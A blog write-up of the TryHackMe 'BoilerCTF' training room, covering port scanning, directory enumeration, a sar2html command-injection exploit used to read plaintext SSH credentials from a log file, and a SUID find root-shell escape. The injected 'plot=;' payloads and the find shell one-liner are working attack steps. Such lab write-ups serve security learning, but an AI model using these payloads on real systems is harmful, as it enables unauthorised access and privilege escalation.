<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="BoilerCTF Walkthrough" /><meta property="og:locale" content="en" /><meta name="description" content="Preface Hey there! have to say this was frustratingly fun lol, filled with so many dead ends too. You could check it out here Tryhackme, I’ll walk you through buddy!" /><meta property="og:description" content="Preface Hey there! have to say this was frustratingly fun lol, filled with so many dead ends too. You could check it out here Tryhackme, I’ll walk you through buddy!" /><link rel="canonical" href="/posts/BoilerCTF-Writeup/" /><meta property="og:url" content="/posts/BoilerCTF-Writeup/" /><meta property="og:site_name" content="Rami3l" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-19T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="BoilerCTF Walkthrough" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-02T16:14:43+01:00","datePublished":"2022-04-19T00:00:00+01:00","description":"Preface Hey there! have to say this was frustratingly fun lol, filled with so many dead ends too. You could check it out here Tryhackme, I’ll walk you through buddy!","headline":"BoilerCTF Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/BoilerCTF-Writeup/"},"url":"/posts/BoilerCTF-Writeup/"}</script><title>BoilerCTF Walkthrough | Rami3l</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Rami3l"><meta name="application-name" content="Rami3l"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/avi.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Rami3l</a></div><div class="site-subtitle font-italic">The only true wisdom is in knowing you know nothing.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Rami3ll" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['anonRamiel','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>BoilerCTF Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>BoilerCTF Walkthrough</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1650322800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Apr 19, 2022 </em> </span> <span> Updated <em class="" data-ts="1651504483" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 2, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">Johnson Daniel Olamide</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2296 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h1 id="preface">Preface</h1><p>Hey there! have to say this was frustratingly fun lol, filled with so many dead ends too. You could check it out here <a href="https://www.tryhackme.com/room/boilerctf2">Tryhackme</a>, I’ll walk you through buddy!</p><h2 id="hints"><span class="mr-2">Hints</span><a href="#hints" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Recursive enumeration<li>Don’t bother Bruteforcing… You’re overthinking it.<li>2HTML<li>Exploit-DB</ul><h2 id="scanning--enumeration"><span class="mr-2">Scanning &amp; Enumeration::</span><a href="#scanning--enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>As always:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
</pre><td class="rouge-code"><pre>┌──(azazel㉿azazel)-[~]
└─$ sudo nmap -sV -sC -sS 10.10.47.112 -vv -p- -T4                                                              130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 21:14 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:14
Completed NSE at 21:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:14
Completed NSE at 21:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:14
Completed NSE at 21:14, 0.00s elapsed
Initiating Ping Scan at 21:14
Scanning 10.10.47.112 [4 ports]
Completed Ping Scan at 21:14, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:14
Completed Parallel DNS resolution of 1 host. at 21:14, 0.28s elapsed
Initiating SYN Stealth Scan at 21:14
Scanning 10.10.47.112 [65535 ports]
Discovered open port 80/tcp on 10.10.47.112
Discovered open port 21/tcp on 10.10.47.112
Increasing send delay for 10.10.47.112 from 0 to 5 due to 874 out of 2184 dropped probes since last increase.
Increasing send delay for 10.10.47.112 from 5 to 10 due to 11 out of 23 dropped probes since last increase.
SYN Stealth Scan Timing: About 4.69% done; ETC: 21:25 (0:10:30 remaining)
SYN Stealth Scan Timing: About 16.23% done; ETC: 21:33 (0:15:19 remaining)
SYN Stealth Scan Timing: About 17.14% done; ETC: 21:35 (0:16:46 remaining)
Warning: 10.10.47.112 giving up on port because retransmission cap hit (6).
Discovered open port 55007/tcp on 10.10.47.112
SYN Stealth Scan Timing: About 80.18% done; ETC: 21:38 (0:04:40 remaining)
Discovered open port 10000/tcp on 10.10.47.112
SYN Stealth Scan Timing: About 85.05% done; ETC: 21:38 (0:03:29 remaining)
SYN Stealth Scan Timing: About 90.04% done; ETC: 21:38 (0:02:18 remaining)
SYN Stealth Scan Timing: About 95.08% done; ETC: 21:37 (0:01:08 remaining)
Completed SYN Stealth Scan at 21:38, 1406.17s elapsed (65535 total ports)
Initiating Service scan at 21:38
Scanning 4 services on 10.10.47.112
Completed Service scan at 21:38, 6.57s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.47.112.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:38
NSE: [ftp-bounce 10.10.47.112:21] PORT response: 500 Illegal PORT command.
Completed NSE at 21:39, 30.30s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 1.89s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 0.01s elapsed
Nmap scan report for 10.10.47.112
Host is up, received echo-reply ttl 63 (0.26s latency).
Scanned at 2022-04-19 21:14:58 WAT for 1445s
Not shown: 65406 closed tcp ports (reset), 125 filtered tcp ports (no-response)
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.45.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 37A72E58B1456207D2E4673B3F824AAF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
55007/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1446.21 seconds
           Raw packets sent: 79609 (3.503MB) | Rcvd: 88232 (6.783MB)

</pre></table></code></div></div><p>From our scans we have Ftp, http, ssh(on a rather uncommon port) and Webmin to work with.</p><p>We got anon logins from ftp, so I hit the server <img data-src="/assets/img/posts/BoilerCTF/boiler-ftp.png" alt="image" data-proofer-ignore></p><p>A “full”(ls -la) directory listing gave me the .info.txt which was well…pretty useless:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(azazel㉿azazel)-[~/Tryhackme/BoilerCTF]
└─$ cat info.txt            
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
</pre></table></code></div></div><p>Contained a ROT13 encoded text which translated into a humble reminder from <a href="https://www.tryhackme.com/p/MrSeth6797">Seth</a>, on enumreration as the key… <img data-src="/assets/img/posts/BoilerCTF/decode.png" alt="image" data-proofer-ignore></p><p>How very thoughtful:) Moving on, I decide to check out our buddy on port 80! We’re greeted with the default Apache landing page, on checking the source I find no suspiscious content, say less:: <img data-src="/assets/img/posts/BoilerCTF/dir-enum.png" alt="image" data-proofer-ignore></p><p>Robots.txt tells gives us this info:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
</pre></table></code></div></div><p>At this point I realized this was going to be a frustrating room, the sequence of numerics at the end seemed like a decimal encoding but on translating it didn’t mean anything of importance… Let’s visit the “Joomla” directory, it is apparently a CMS with a crazy tonne of exploits, at this point I ran a recursive directory bruteforce to find a login page, so maybe I could gain admin access and try to spawn a shell::</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
</pre><td class="rouge-code"><pre>┌──(azazel㉿azazel)-[~]
└─$ dirsearch -u http://10.10.47.112/  -w /usr/share/wordlists/dirb/common.txt -t 10 -r

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 10 | Wordlist size: 4613

Output File: /home/azazel/.dirsearch/reports/10.10.47.112/-_22-04-19_21-29-55.txt

Error Log: /home/azazel/.dirsearch/logs/errors-22-04-19_21-29-55.log

Target: http://10.10.47.112/

[21:29:56] Starting: 
[21:31:09] 200 -   11KB - /index.html
[21:31:14] 301 -  313B  - /joomla  -&gt;  http://10.10.47.112/joomla/     (Added to queue)
[21:31:23] 301 -  313B  - /manual  -&gt;  http://10.10.47.112/manual/     (Added to queue)
[21:31:54] 200 -  257B  - /robots.txt
[21:31:59] 403 -  300B  - /server-status
[21:32:33] Starting: joomla/
[21:32:37] 301 -  322B  - /joomla/_archive  -&gt;  http://10.10.47.112/joomla/_archive/     (Added to queue)
[21:32:37] 301 -  323B  - /joomla/_database  -&gt;  http://10.10.47.112/joomla/_database/     (Added to queue)
[21:32:37] 301 -  320B  - /joomla/_files  -&gt;  http://10.10.47.112/joomla/_files/     (Added to queue)
[21:32:39] 301 -  319B  - /joomla/_test  -&gt;  http://10.10.47.112/joomla/_test/     (Added to queue)     
[21:32:40] 301 -  318B  - /joomla/~www  -&gt;  http://10.10.47.112/joomla/~www/     (Added to queue)
[21:32:45] 301 -  327B  - /joomla/administrator  -&gt;  http://10.10.47.112/joomla/administrator/     (Added to queue)
[21:32:55] 301 -  317B  - /joomla/bin  -&gt;  http://10.10.47.112/joomla/bin/     (Added to queue)
[21:32:57] 301 -  319B  - /joomla/build  -&gt;  http://10.10.47.112/joomla/build/     (Added to queue)
[21:32:58] 301 -  319B  - /joomla/cache  -&gt;  http://10.10.47.112/joomla/cache/     (Added to queue)
[21:33:06] 301 -  324B  - /joomla/components  -&gt;  http://10.10.47.112/joomla/components/     (Added to queue)
[21:33:39] 301 -  320B  - /joomla/images  -&gt;  http://10.10.47.112/joomla/images/     (Added to queue)
[21:33:40] 301 -  322B  - /joomla/includes  -&gt;  http://10.10.47.112/joomla/includes/     (Added to queue)
[21:33:41] 200 -   12KB - /joomla/index.php
[21:33:42] 301 -  326B  - /joomla/installation  -&gt;  http://10.10.47.112/joomla/installation/     (Added to queue)
[21:33:47] 301 -  322B  - /joomla/language  -&gt;  http://10.10.47.112/joomla/language/     (Added to queue)
[21:33:47] 301 -  321B  - /joomla/layouts  -&gt;  http://10.10.47.112/joomla/layouts/     (Added to queue)
[21:33:48] 301 -  323B  - /joomla/libraries  -&gt;  http://10.10.47.112/joomla/libraries/     (Added to queue)
[21:33:55] 301 -  319B  - /joomla/media  -&gt;  http://10.10.47.112/joomla/media/     (Added to queue)
[21:33:58] 301 -  321B  - /joomla/modules  -&gt;  http://10.10.47.112/joomla/modules/     (Added to queue)
[21:34:12] 301 -  321B  - /joomla/plugins  -&gt;  http://10.10.47.112/joomla/plugins/     (Added to queue)
[21:34:44] 301 -  323B  - /joomla/templates  -&gt;  http://10.10.47.112/joomla/templates/     (Added to queue)
[21:34:45] 301 -  319B  - /joomla/tests  -&gt;  http://10.10.47.112/joomla/tests/     (Added to queue)
[21:34:46] 301 -  317B  - /joomla/tmp  -&gt;  http://10.10.47.112/joomla/tmp/     (Added to queue)
[21:35:05] Starting: manual/
[21:35:45] 301 -  316B  - /manual/da  -&gt;  http://10.10.47.112/manual/da/     (Added to queue)
[21:35:46] 301 -  316B  - /manual/de  -&gt;  http://10.10.47.112/manual/de/     (Added to queue)
[21:35:54] 301 -  316B  - /manual/en  -&gt;  http://10.10.47.112/manual/en/     (Added to queue)
[21:35:56] 301 -  316B  - /manual/es  -&gt;  http://10.10.47.112/manual/es/     (Added to queue)
[21:36:04] 301 -  316B  - /manual/fr  -&gt;  http://10.10.47.112/manual/fr/     (Added to queue)
[21:36:14] 301 -  320B  - /manual/images  -&gt;  http://10.10.47.112/manual/images/     (Added to queue)
[21:36:15] 200 -  626B  - /manual/index.html
[21:36:19] 301 -  316B  - /manual/ja  -&gt;  http://10.10.47.112/manual/ja/     (Added to queue)
[21:36:22] 301 -  316B  - /manual/ko  -&gt;  http://10.10.47.112/manual/ko/     (Added to queue)
[21:37:18] 301 -  319B  - /manual/style  -&gt;  http://10.10.47.112/manual/style/     (Added to queue)
[21:37:27] 301 -  316B  - /manual/tr  -&gt;  http://10.10.47.112/manual/tr/     (Added to queue)
[21:37:44] 301 -  319B  - /manual/zh-cn  -&gt;  http://10.10.47.112/manual/zh-cn/     (Added to queue)
[21:37:44] Starting: joomla/_archive/
[21:38:57] 200 -  162B  - /joomla/_archive/index.html
[21:40:35] Starting: joomla/_database/
[21:41:52] 200 -  160B  - /joomla/_database/index.html
[21:43:30] Starting: joomla/_files/
[21:44:50] 200 -  168B  - /joomla/_files/index.html
[21:46:35] Starting: joomla/_test/
[21:47:53] 200 -    5KB - /joomla/_test/index.php  
[21:49:42] Starting: joomla/~www/
[21:51:03] 200 -  162B  - /joomla/~www/index.html
[21:52:41] Starting: joomla/administrator/
[21:53:15] 301 -  333B  - /joomla/administrator/cache  -&gt;  http://10.10.47.112/joomla/administrator/cache/     (Added to queue)
[21:53:23] 301 -  338B  - /joomla/administrator/components  -&gt;  http://10.10.47.112/joomla/administrator/components/     (Added to queue)
[21:53:56] 301 -  332B  - /joomla/administrator/help  -&gt;  http://10.10.47.112/joomla/administrator/help/ 
[21:54:01] 200 -    5KB - /joomla/administrator/index.php
[21:54:14] 301 -  332B  - /joomla/administrator/logs  -&gt;  http://10.10.47.112/joomla/administrator/logs/     (Added to queue)
[21:54:21] 301 -  335B  - /joomla/administrator/modules  -&gt;  http://10.10.47.112/joomla/administrator/modules/     (Added to queue)
[21:55:18] 301 -  337B  - /joomla/administrator/templates  -&gt;  http://10.10.47.112/joomla/administrator/templates/     (Added to queue)
CTRL+C detected: Pausing threads, please wait...
</pre></table></code></div></div><p>Sheesh, alot of sub directories uhn?</p><p>First thing I checked was this <code class="language-plaintext highlighter-rouge">-&gt; http://10.10.47.112/joomla/administrator/</code></p><p>Which led to a login page, a bruteforce attempt isnt so wise here cause I found a csrf token in the source code(I read up on this and apparently it would hinder an exhaustive search since it expires on first login attempt)</p><p>I decided to swiftly visit all the other subdirs to find anything we could leverage to maybe spawn a shell or get ssh keys somehow… <img data-src="/assets/img/posts/BoilerCTF/dead-end.png" alt="image" data-proofer-ignore> <img data-src="/assets/img/posts/BoilerCTF/dead-end2.png" alt="image" data-proofer-ignore> <img data-src="/assets/img/posts/BoilerCTF/code3.png" alt="image" data-proofer-ignore></p><p>One of the few encoded texts translated to this :: <img data-src="/assets/img/posts/BoilerCTF/decrypt3.png" alt="image" data-proofer-ignore></p><p>This machine was taunting me at this point.</p><h2 id="exploitation"><span class="mr-2">Exploitation💀</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To cut to the chase, after all the swift fails and checking webmin on port 10000, I decided to revisit this weird test directory I found</p><p><code class="language-plaintext highlighter-rouge">/joomla/_test -&gt; http://10.10.47.112/joomla/_test/</code></p><p>We find a sar2html page out of curiousity:: <em>Basically a sar2html is an opensource project that converts sar binary data to graphical html</em></p><p>My interest specifically was in exploiting this… on checking exploitdb, an RCE exploit exists for vulnerable version 3.2.1:: <img data-src="/assets/img/posts/BoilerCTF/exploit.png" alt="image" data-proofer-ignore></p><p>From this exploit:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>In web application you will see index.php?plot url extension.

http://&lt;ipaddr&gt;/index.php?plot=;&lt;command-here&gt; will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
</pre></table></code></div></div><p>It looks like once we replace the post argument in the query string in the url with a command of our choice, it executes on the system, like a passive command injection!(passive because the results of the executed commands are not directly outputted onto the screen but still executes in the background by the system) Awesome!</p><p>To test our exploit::</p><p><img data-src="/assets/img/posts/BoilerCTF/exploit-use.png" alt="image" data-proofer-ignore></p><p>To reveal the result of our query-inserted command, just click on the “Select Host” option and the drop down will reveal the results of the query which was passed as a system command! It also appears to have a weird log.txt document in the current directory when you execute “ls -la” by inserting it like so</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://&lt;ipaddr&gt;/index.php?plot=;ls -la
</pre></table></code></div></div><p>Just cat log.txt, and click select host to display the command output.::</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://&lt;ipaddr&gt;/index.php?plot=; cat log.txt
</pre></table></code></div></div><p><img data-src="/assets/img/posts/BoilerCTF/ssh-creds.png" alt="image" data-proofer-ignore></p><p>It looks like the log file contains ssh creds of a user “Basterd” and his pass all in plaintext. Hehee😈</p><h2 id="initial-access--priviledge-escalation"><span class="mr-2">Initial Access &amp; Priviledge escalation::</span><a href="#initial-access--priviledge-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h4 id="hackers-dont-break-in-we-log-in"><span class="mr-2"><em>Hackers don’t break in, we log in</em></span><a href="#hackers-dont-break-in-we-log-in" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img data-src="/assets/img/posts/BoilerCTF/initial-access.png" alt="image" data-proofer-ignore></p><p>In “his” home directory seems there is some sort of backup script that belongs to another use who has a little more priviledges by virtue of SUID bit set for him on the find binary, cat the file and we have his creds, horizontal privesc with with his creds and then navigate to his home directory, the .secret file contains the first flag and then to privesc we have SUID bit set on find</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>find / -type f -perm -4000 2&gt;/dev/null 
 OR 
find / -type f -perm -u=s 2&gt;dev/null
</pre></table></code></div></div><p><a href="https://gtfobins.github.io/gtfobins/find/#suid">GTFOBins</a> says we could use the misconfigured binary by running</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/find . -exec /bin/sh -p \; -quit
</pre></table></code></div></div><p>And spawn a priviledged shell and read our root flag, like so:: <img data-src="/assets/img/posts/BoilerCTF/end.jpg" alt="image" data-proofer-ignore></p><p>Rooted!!</p><p>Salam, from <a href="https://www.tryhackme.com/p/Rami3l">Rami3l</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >Command Injection</a> <a href="/tags/cms/" class="post-tag no-text-decoration" >CMS</a> <a href="/tags/enumeration/" class="post-tag no-text-decoration" >Enumeration</a> <a href="/tags/sar2html/" class="post-tag no-text-decoration" >Sar2HTML</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=BoilerCTF+Walkthrough+-+Rami3l&url=%2Fposts%2FBoilerCTF-Writeup%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab 